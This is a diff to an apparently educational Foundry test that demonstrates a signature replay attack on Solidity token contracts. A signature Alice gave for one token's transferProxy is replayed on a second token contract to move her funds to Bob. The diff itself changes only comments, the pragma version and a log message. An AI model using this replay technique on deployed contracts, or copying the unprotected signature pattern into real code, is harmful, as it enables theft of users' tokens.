@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.13;
+pragma solidity ^0.8.15;
 
 import "forge-std/Test.sol";
 
@@ -40,11 +40,12 @@ function testSignatureReplay() public {
     // Bob successfully transferred funds from Alice.
     emit log_named_uint("SET token balance of Bob",TokenWhaleContract.balanceOf(address(bob)));
 
-    // Because we have nonce, so we can not replay again in same contract. BTW this nonce start from 0, it's not best practice.
+    // Because we have nonce protect to replay, so we can not replay again in the same contract. 
+    // BTW this nonce start from 0, it's not a best practice.
     // TokenWhaleContract.transferProxy(address(alice),address(bob),499,1,v,r,s);
-    //emit log_named_uint("Balance of Bob",TokenWhaleContract.balanceOf(address(bob)));
+    // emit log_named_uint("Balance of Bob",TokenWhaleContract.balanceOf(address(bob)));
 
-    emit log_string("Try to replay to another contract");
+    emit log_string("Try to replay to another contract with same signature");
     emit log_named_uint("Before the replay, SIX token balance of bob:",SixEyeTokenContract.balanceOf(address(bob)));
  
     SixEyeTokenContract.transferProxy(address(alice),address(bob),499,1,v,r,s);
